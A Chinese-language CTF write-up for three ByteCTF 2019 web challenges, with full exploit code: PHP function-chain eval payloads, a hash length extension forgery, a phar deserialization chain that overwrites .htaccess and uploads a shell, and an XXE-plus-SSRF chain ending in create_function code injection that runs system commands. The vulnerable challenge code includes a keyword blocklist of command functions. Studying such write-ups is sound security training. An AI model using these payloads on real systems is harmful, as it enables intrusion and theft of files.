---
title: bytectf2019
author: ch3n9w
date: 2019-09-09 08:18:25
categories: CTF
typora-root-url: ../
cover:
  image: image-20211114141103041.png
---

## boring code

source code



```php
<?php
function is_valid_url($url) {
    if (filter_var($url, FILTER_VALIDATE_URL)) {
        if (preg_match('/data:\/\//i', $url)) {
            return false;
        }
        return true;
    }
    return false;
}

if (isset($_POST['url'])){
    $url = $_POST['url'];
    if (is_valid_url($url)) {
        $r = parse_url($url);
        if (preg_match('/baidu\.com$/', $r['host'])) {
            $code = file_get_contents($url);
            if (';' === preg_replace('/[a-z]+\((?R)?\)/', NULL, $code)) {
                if (preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', $code)) {
                    echo 'bye~';
                } else {
                    eval($code);
                }
            }
        } else {
            echo "error: host not allowed";
        }
    } else {
        echo "error: invalid url";
    }
}else{
    highlight_file(__FILE__);
}
```

思路: 注册一个xxxxbaidu.com 形式的域名.绑定到服务器上后放上自己的代码,payload

```
if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array()))))))));
```

```
echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));
```

这两个payload都很精彩, 涉及的知识点如下:

- crypt 函数没有key的时候随机生成key进行加密, 如果多尝试几次加密的话就会发现有几次的加密结果中的末尾有点号.

- ord函数传入字符串的时候, 只返回第一个字符的ascii码

- localeconv函数返回一组包含本地数字和货币格式的数组, 数组第一位是"小数点字符",  也就是点号

- ```
  php > var_dump(localeconv());
  array(18) {
    ["decimal_point"]=>
    string(1) "."
    ["thousands_sep"]=>
    string(0) ""
    ["int_curr_symbol"]=>
    string(0) ""
    ["currency_symbol"]=>
    string(0) ""
    ["mon_decimal_point"]=>
    string(0) ""
    ["mon_thousands_sep"]=>
    string(0) ""
    ["positive_sign"]=>
    string(0) ""
    ["negative_sign"]=>
    string(0) ""
    ["int_frac_digits"]=>
    int(127)
    ["frac_digits"]=>
    int(127)
    ["p_cs_precedes"]=>
    int(127)
    ["p_sep_by_space"]=>
    int(127)
    ["n_cs_precedes"]=>
    int(127)
    ["n_sep_by_space"]=>
    int(127)
    ["p_sign_posn"]=>
    int(127)
    ["n_sign_posn"]=>
    int(127)
    ["grouping"]=>
    array(0) {
    }
    ["mon_grouping"]=>
    array(0) {
    }
  }
  php >
  ```

- pos() 函数是current函数的别名

- time() 返回时间戳整数, 从中无法提出点号

- localtime第一参数默认是time(), 不能接受布尔值也就是chdir的返回值

- localtime() 返回数组来表示当前时间, 第一项是当前的秒数, 要让chr转换成点号的话就要在第46秒执行

  

## ezCMS

源码``www.zip``, 关键代码如下:

身份验证部分

```
function login(){
    $secret = "********";
    setcookie("hash", md5($secret."adminadmin"));
    return 1;

}
function is_admin(){
    $secret = "********";
    $username = $_SESSION['username'];
    $password = $_SESSION['password'];
    if ($username == "admin" && $password != "admin"){
        if ($_COOKIE['user'] === md5($secret.$username.$password)){
            return 1;
        }
    }
    return 0;
}
```

可以明显看出这里有哈希长度扩展攻击.

哈希生成

```
./hash_extender -d 'admin' -s 52107b08c0f3342d2153ae1d68e6262c -f md5 -a 'ch3n9w' --out-data-format=html -l 13 --quiet
```

得到了新的哈希值,添加到cookie[user]中

然后新的登录用户名: admin

用户密码:admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%90%00%00%00%00%00%00%00ch3n9w

第二部分反序列化代码审计.

```php
class Check{
    public $filename;

    function __construct($filename)
    {
        $this->filename = $filename;
    }

    function check(){
        $content = file_get_contents($this->filename);
        $black_list = ['system','eval','exec','+','passthru','`','assert'];
        foreach ($black_list as $k=>$v){
            if (stripos($content, $v) !== false){
                die("your file make me scare");
            }
        }
        return 1;
    }
}

class File{

    public $filename;
    public $filepath;
    public $checker;

    function __construct($filename, $filepath)
    {
        $this->filepath = $filepath;
        $this->filename = $filename;
    }

    public function view_detail(){

        if (preg_match('/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i', $this->filepath)){
            die("nonono~");
        }
        $mine = mime_content_type($this->filepath);
        $store_path = $this->open($this->filename, $this->filepath);
        $res['mine'] = $mine;
        $res['store_path'] = $store_path;
        return $res;

    }

    public function open($filename, $filepath){
        $res = "$filename is in $filepath";
        return $res;
    }

    function __destruct()
    {
        if (isset($this->checker)){
            $this->checker->upload_file();
        }
    }

}

class Admin{
    public $size;
    public $checker;
    public $file_tmp;
    public $filename;
    public $upload_dir;
    public $content_check;

    function __construct($filename, $file_tmp, $size)
    {
        $this->upload_dir = 'sandbox/'.md5($_SERVER['REMOTE_ADDR']);
        if (!file_exists($this->upload_dir)){
            mkdir($this->upload_dir, 0777, true);
        }
        if (!is_file($this->upload_dir.'/.htaccess')){
            file_put_contents($this->upload_dir.'/.htaccess', 'lolololol, i control all');
        }
        $this->size = $size;
        $this->filename = $filename;
        $this->file_tmp = $file_tmp;
        $this->content_check = new Check($this->file_tmp);
        $profile = new Profile();
        $this->checker = $profile->is_admin();
    }

    public function upload_file(){

        if (!$this->checker){
            die('u r not admin');
        }
        $this->content_check -> check();
        $tmp = explode(".", $this->filename);
        $ext = end($tmp);
        if ($this->size > 204800){
            die("your file is too big");
        }
        move_uploaded_file($this->file_tmp, $this->upload_dir.'/'.md5($this->filename).'.'.$ext);
    }

    public function __call($name, $arguments)
    {

    }
}

class Profile{

    public $username;
    public $password;
    public $admin;

    public function is_admin(){
        $this->username = $_SESSION['username'];
        $this->password = $_SESSION['password'];
        $secret = "********";
        if ($this->username === "admin" && $this->password != "admin"){
            if ($_COOKIE['user'] === md5($secret.$this->username.$this->password)){
                return 1;
            }
        }
        return 0;

    }
    function __call($name, $arguments)
    {
        $this->admin->open($this->username, $this->password);
    }
}
```

利用链:

- 上传exp.phar
- 绕过waf使用``php://filter/read=convert.base64-encode/resource=phar://exp.phar``触发phar让他反序列中file类的destruct, upload_file触发profile的__call函数, 触发open函数
- profile->admin声明为ZipArchive类, 利用这个原生类的同名函数open来删除原有的.htaccess, 删除完之后再传一个shell就可以了

exp:

```php
<?php
class File{
    public $filename;
    public $filepath;
    public $checker;

    function __construct()
    {
        $this->checker = new Admin();
    }
}

class Admin{
    public $size;
    public $checker;
    public $file_tmp;
    public $filename;
    public $upload_dir;
    public $file_error;
    public $content_check;
    public $obj;
    public $filepath;

    function __construct()
    {
        $this->checker = 1;
        $this->size = 1024;
        $this->content_check = new Profile();
    }
}

class Profile{
    public $username;
    public $password;
    public $admin;

    function __construct()
    {
        $this->admin = new ZipArchive();
        $this->username = "/var/www/html/sandbox/76c98b2e4f0f7a9a467bcf459b36ab5c/.htaccess";
        $this->password = ZipArchive::OVERWRITE;
    }
}

@unlink("exp.phar");
$phar = new Phar('exp.phar');
$phar -> startBuffering();
$phar -> setStub('GIF89a'.'<?php __HALT_COMPILER();?>');
$phar -> addFromString('test.txt','test');
$object = new File();
$phar -> setMetadata($object);
$phar -> stopBuffering();
```

shell.php

```
<?php
echo file_get_contents('/flag');
```



## rss



data protocol format:

```
data:[<mime type>][;charset=<charset>][;base64],<encoded data>
```

说是php对mine type不敏感, 那么可以这样子写

```
data://baidu.com/plain;base64,xxxxxxxxx==
```

然后看rss的定义:

> What is RSS?
>
> It is a format to share data, defined in the [1.0 version](https://www.xul.fr/en-xml.php) of XML. You can deliver information in this format et one can get this information, and information from other various sources, in this format. Information provided by a website in an XML file is called an RSS feed.
> Recent browsers can read directly RSS files, but a special **RSS reader** or **aggregator** may be used too.

所以所谓的rss就是xml.

尝试测试

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
    <title>The Blog</title>
    <link>http://example.com/</link>
    <description>A blog about things</description>
    <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
    <item>
        <title>&xxe;</title>
        <link>http://example.com</link>
        <description>a post</description>
        <author>author@example.com</author>
        <pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
    </item>
</channel>
</rss>
```

将上述内容base64编码之后用之前的data协议传入进去, 触发成功.

接下来就读取源码就行了.

不熟悉MVC架构....读完index.php之后就不知道读什么.....

index.php 中有routes.php, 根据routes.php再去读controllers/Admin.php, 然后又去读views/Admin.php

然后关键代码

```
usort($data, create_function('$a, $b', 'return strcmp($a->'.$order.',$b->'.$order.');'));
```

直接拼接

exp.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://127.0.0.1/rss_in_order?rss_url=https://view.news.qq.com/index2010/zhuanti/ztrss.xml&order=%24b%2C%24a)%3B%7Dsystem('cat%20%2Fflag_eb8ba2eb07702e69963a7d6ab8669134')%3B%2F%2F" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
    <title>The Blog</title>
    <link>http://example.com/</link>
    <description>A blog about things</description>
    <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
    <item>
        <title>&xxe;</title>
        <link>http://example.com</link>
        <description>a post</description>
        <author>author@example.com</author>
        <pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
    </item>
</channel>
</rss>
```

```
$b,$a);}system('cat /flag_eb8ba2eb07702e69963a7d6ab8669134');"
```

